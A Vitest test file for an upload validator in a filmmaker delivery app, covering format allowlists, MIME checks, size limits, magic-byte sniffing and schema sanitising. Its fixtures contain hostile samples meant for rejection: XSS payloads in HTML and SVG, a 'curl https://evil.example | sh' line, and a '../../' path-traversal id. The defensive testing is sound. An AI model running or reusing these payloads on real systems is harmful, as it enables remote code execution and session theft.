import { describe, expect, it } from "vitest";
import {
  MAX_UPLOAD_BYTES,
  UPLOAD_ACCEPT,
  assetTypeForFile,
  bytesMatchAssetType,
  checkUploadFile,
  confirmUploadSchema,
  contentTypeForUpload,
  isStandalonePortfolioUpload,
  requestUploadSchema,
  sniffMediaKind,
} from "@/lib/validations/upload";

/** Bytes from ASCII strings and byte arrays, padded so sniffing has enough to look at. */
function bytes(...parts: Array<string | number[]>): Uint8Array {
  const out = parts.flatMap((part) => (typeof part === "string" ? Array.from(part, (c) => c.charCodeAt(0)) : part));
  while (out.length < 64) out.push(0);
  return Uint8Array.from(out);
}

const SAMPLES = {
  mp4: bytes([0, 0, 0, 0x20], "ftypisom", [0, 0, 2, 0], "isomiso2avc1mp41"),
  mov: bytes([0, 0, 0, 0x14], "ftypqt  ", [0, 0, 2, 0]),
  legacyMov: bytes([0, 0, 0, 0x08], "wide", [0, 0, 0, 0], "mdat"),
  mkv: bytes([0x1a, 0x45, 0xdf, 0xa3, 0x9f, 0x42, 0x86, 0x81, 0x01]),
  avi: bytes("RIFF", [0x10, 0, 0, 0], "AVI LIST"),
  mxf: bytes([0x06, 0x0e, 0x2b, 0x34, 0x02, 0x05, 0x01, 0x01, 0x0d, 0x01, 0x02, 0x01, 0x01, 0x02, 0x04, 0x00]),
  jpeg: bytes([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10], "JFIF"),
  png: bytes([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0x0d], "IHDR"),
  gif: bytes("GIF89a", [0x01, 0x00, 0x01, 0x00]),
  webp: bytes("RIFF", [0x24, 0, 0, 0], "WEBPVP8 "),
  tiff: bytes([0x49, 0x49, 0x2a, 0x00, 0x08, 0, 0, 0]),
  heic: bytes([0, 0, 0, 0x18], "ftypheic", [0, 0, 0, 0], "mif1heic"),
  avif: bytes([0, 0, 0, 0x1c], "ftypavif", [0, 0, 0, 0], "avifmif1miaf"),
  html: bytes("<!DOCTYPE html><html><script>alert(document.cookie)</script></html>"),
  indentedHtml: bytes("\n\n   <html><body onload=alert(1)>"),
  svg: bytes('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'),
  bareSvg: bytes('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
  shell: bytes("#!/bin/sh\ncurl https://evil.example | sh\n"),
  js: bytes("fetch('/api/media/private/workspaces/x').then(r => r.text())"),
};

describe("upload allowlist", () => {
  it("accepts the video and photo formats filmmakers deliver, with the content type they're stored as", () => {
    const videos: Array<[string, string]> = [
      ["cut.mp4", "video/mp4"],
      ["cut.MOV", "video/quicktime"],
      ["cut.m4v", "video/x-m4v"],
      ["cut.webm", "video/webm"],
      ["cut.mkv", "video/x-matroska"],
      ["master.mxf", "application/mxf"],
      ["old.avi", "video/x-msvideo"],
    ];
    for (const [filename, contentType] of videos) {
      expect(checkUploadFile({ assetType: "video", filename, sizeBytes: 10 }), filename).toEqual({
        ok: true,
        extension: filename.split(".").pop()!.toLowerCase(),
        contentType,
      });
    }
    const photos: Array<[string, string]> = [
      ["a.jpg", "image/jpeg"],
      ["a.jpeg", "image/jpeg"],
      ["a.png", "image/png"],
      ["a.webp", "image/webp"],
      ["a.avif", "image/avif"],
      ["a.heic", "image/heic"],
      ["a.heif", "image/heif"],
      ["a.tif", "image/tiff"],
      ["a.tiff", "image/tiff"],
      ["a.gif", "image/gif"],
    ];
    for (const [filename, contentType] of photos) {
      expect(checkUploadFile({ assetType: "photo_gallery", filename, sizeBytes: 10 })).toMatchObject({ ok: true, contentType });
    }
  });

  it("never accepts SVG, HTML, scripts or other files, under any asset type", () => {
    for (const filename of ["logo.svg", "page.html", "page.htm", "x.js", "x.mjs", "run.sh", "a.exe", "a.pdf", "noext", "cut.mp4.html"]) {
      expect(checkUploadFile({ assetType: "video", filename, sizeBytes: 10 }).ok, filename).toBe(false);
      expect(checkUploadFile({ assetType: "photo_gallery", filename, sizeBytes: 10 }).ok, filename).toBe(false);
    }
    // A video extension isn't a photo, and the other way around.
    expect(checkUploadFile({ assetType: "photo_gallery", filename: "cut.mp4", sizeBytes: 10 }).ok).toBe(false);
    expect(checkUploadFile({ assetType: "video", filename: "still.jpg", sizeBytes: 10 }).ok).toBe(false);
  });

  it("requires the declared MIME type to match the extension (or be unknown)", () => {
    const check = (filename: string, declaredType: string) =>
      checkUploadFile({ assetType: "video", filename, declaredType, sizeBytes: 10 });
    expect(check("cut.mp4", "video/mp4").ok).toBe(true);
    expect(check("cut.mp4", "").ok).toBe(true);
    expect(check("cut.mp4", "application/octet-stream").ok).toBe(true);
    expect(check("cut.m4v", "video/mp4").ok).toBe(true);
    expect(check("cut.mov", "video/quicktime; codecs=avc1").ok).toBe(true);
    expect(check("cut.mp4", "text/html")).toMatchObject({ ok: false, error: expect.stringContaining("text/html") });
    expect(check("cut.mp4", "image/svg+xml").ok).toBe(false);
    expect(check("cut.mov", "video/webm").ok).toBe(false);
    expect(
      checkUploadFile({ assetType: "photo_gallery", filename: "a.png", declaredType: "image/svg+xml", sizeBytes: 10 }).ok
    ).toBe(false);
  });

  it("limits a file to 5 GB (one presigned PUT) and refuses empty files", () => {
    expect(checkUploadFile({ assetType: "video", filename: "a.mp4", sizeBytes: MAX_UPLOAD_BYTES }).ok).toBe(true);
    expect(checkUploadFile({ assetType: "video", filename: "a.mp4", sizeBytes: MAX_UPLOAD_BYTES + 1 })).toMatchObject({
      ok: false,
      error: "Files can be at most 5 GB.",
    });
    expect(checkUploadFile({ assetType: "video", filename: "a.mp4", sizeBytes: 0 }).ok).toBe(false);
    expect(checkUploadFile({ assetType: "video", filename: "a.mp4", sizeBytes: 1.5 }).ok).toBe(false);
  });

  it("picks the asset type from the extension, and gives stored content types for keys", () => {
    expect(assetTypeForFile("IMG_0001.HEIC")).toBe("photo_gallery");
    expect(assetTypeForFile("reel.mkv")).toBe("video");
    expect(assetTypeForFile("logo.svg")).toBeNull();
    expect(contentTypeForUpload("video", "private/workspaces/w/deliveries/d/assets/a/v1/1-cut.mov")).toBe("video/quicktime");
    expect(contentTypeForUpload("photo_gallery", "public/workspaces/w/portfolio/x.svg")).toBeNull();
    expect(UPLOAD_ACCEPT).toContain(".mxf");
    expect(UPLOAD_ACCEPT).not.toContain("svg");
  });

  it("marks only the portfolio upload flow outside a delivery as a standalone portfolio piece", () => {
    expect(isStandalonePortfolioUpload("portfolio", null)).toBe(true);
    expect(isStandalonePortfolioUpload("portfolio", "30000000-0000-4000-8000-00000000000a")).toBe(false);
    for (const placement of ["project", "cover", "hero", "branding", undefined] as const) {
      expect(isStandalonePortfolioUpload(placement, null), String(placement)).toBe(false);
    }
  });
});

describe("content sniffing", () => {
  it("recognises real video containers", () => {
    for (const sample of [SAMPLES.mp4, SAMPLES.mov, SAMPLES.legacyMov, SAMPLES.mkv, SAMPLES.avi, SAMPLES.mxf]) {
      expect(bytesMatchAssetType(sample, "video")).toBe(true);
      expect(bytesMatchAssetType(sample, "photo_gallery")).toBe(false);
    }
    expect(sniffMediaKind(SAMPLES.mkv)).toBe("matroska");
    expect(sniffMediaKind(SAMPLES.mxf)).toBe("mxf");
  });

  it("recognises real images, including HEIC and AVIF", () => {
    for (const sample of [SAMPLES.jpeg, SAMPLES.png, SAMPLES.gif, SAMPLES.webp, SAMPLES.tiff, SAMPLES.heic, SAMPLES.avif]) {
      expect(bytesMatchAssetType(sample, "photo_gallery")).toBe(true);
      expect(bytesMatchAssetType(sample, "video")).toBe(false);
    }
    expect(sniffMediaKind(SAMPLES.heic)).toBe("heif");
  });

  it("rejects HTML, SVG and scripts, whatever the file was called", () => {
    for (const sample of [SAMPLES.html, SAMPLES.indentedHtml, SAMPLES.svg, SAMPLES.bareSvg, SAMPLES.shell, SAMPLES.js]) {
      expect(sniffMediaKind(sample)).toBeNull();
      expect(bytesMatchAssetType(sample, "video")).toBe(false);
      expect(bytesMatchAssetType(sample, "photo_gallery")).toBe(false);
    }
    expect(sniffMediaKind(new Uint8Array())).toBeNull();
  });
});

describe("upload request input", () => {
  const valid = {
    workspaceId: "10000000-0000-4000-8000-00000000000a",
    projectId: "30000000-0000-4000-8000-00000000000a",
    title: "Cut",
    filename: "cut.mp4",
    fileSizeBytes: 1024,
    assetType: "video" as const,
  };

  it("accepts a normal request and normalises empty ids", () => {
    const parsed = requestUploadSchema.parse({ ...valid, assetId: "", projectId: "" });
    expect(parsed.assetId).toBeNull();
    expect(parsed.projectId).toBeNull();
  });

  it("requires ids used in object keys to be UUIDs", () => {
    expect(requestUploadSchema.safeParse({ ...valid, assetId: "../../other-workspace" }).success).toBe(false);
    expect(requestUploadSchema.safeParse({ ...valid, workspaceId: "studio-a" }).success).toBe(false);
  });

  it("refuses oversized and fractional sizes and unknown placements", () => {
    expect(requestUploadSchema.safeParse({ ...valid, fileSizeBytes: MAX_UPLOAD_BYTES + 1 }).success).toBe(false);
    expect(requestUploadSchema.safeParse({ ...valid, fileSizeBytes: 10.5 }).success).toBe(false);
    expect(requestUploadSchema.safeParse({ ...valid, placement: "feedback" }).success).toBe(false);
    expect(requestUploadSchema.safeParse({ ...valid, placement: "portfolio" }).success).toBe(true);
  });

  it("drops fields the server decides (visibility, ids, versions) instead of passing them on", () => {
    const parsed = requestUploadSchema.parse({
      ...valid,
      metadata: { isPublic: "true", assetId: "x", versionNumber: "9", assetVersionId: "y" },
      isPublic: true,
    } as any);
    expect(parsed).not.toHaveProperty("metadata");
    expect(parsed).not.toHaveProperty("isPublic");
  });

  it("confirms with the version id only; a location sent along is dropped", () => {
    const parsed = confirmUploadSchema.parse({
      assetVersionId: "50000000-0000-4000-8000-0000000000a1",
      providerUid: "private/workspaces/9b9b9b9b-1111-4222-8333-444455556666/deliveries/x/secret.mp4",
      fileSizeBytes: 1,
    } as any);
    expect(parsed).toEqual({ assetVersionId: "50000000-0000-4000-8000-0000000000a1" });
    expect(confirmUploadSchema.safeParse({ assetVersionId: "not-a-uuid" }).success).toBe(false);
  });
});
